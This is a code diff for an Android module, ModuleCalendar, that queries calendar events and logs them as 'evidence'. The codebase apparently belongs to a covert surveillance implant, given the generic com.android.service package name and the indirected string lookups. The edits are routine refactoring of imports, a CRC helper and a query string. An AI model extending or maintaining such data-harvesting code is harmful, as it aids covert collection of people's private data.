@@ -5,8 +5,6 @@ import java.io.IOException;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.HashSet;
-import java.util.List;
-import java.util.ListIterator;
 
 import android.content.ContentResolver;
 import android.content.Context;
@@ -18,13 +16,9 @@ import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
-import com.android.service.crypto.Encryption;
+import com.android.service.crypto.Digest;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.evidence.Markup;
-import com.android.service.module.task.Contact;
-import com.android.service.module.task.PhoneInfo;
-import com.android.service.module.task.PickContact;
-import com.android.service.module.task.UserInfo;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
@@ -177,7 +171,7 @@ public class ModuleCalendar extends BaseModule {
 			String textUri = builder.build().toString();
 
 			Cursor eventCursor = managedQuery(builder.build(), new String[] { Messages.getString("d.7"), Messages.getString("d.8"), Messages.getString("d.9"), Messages.getString("d.10"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-					Messages.getString("d.11"), Messages.getString("d.12"), Messages.getString("d.13"), Messages.getString("d.14") }, Messages.getString("d.15") + id, null, Messages.getString("d.16")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
+					Messages.getString("d.11"), Messages.getString("d.12"), Messages.getString("d.13"), Messages.getString("d.14") }, Messages.getString("d.15") + "=" + id, null, Messages.getString("d.16")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
 
 			while (eventCursor.moveToNext()) {
 				int index = 0;
@@ -217,7 +211,7 @@ public class ModuleCalendar extends BaseModule {
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
 				// Utils.byteArrayToHex(packet));
 				final Long crcOld = calendar.get(idEvent);
-				final Long crcNew = Encryption.CRC32(packet);
+				final Long crcNew = Digest.CRC32(packet);
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
 				// crcNew);
 
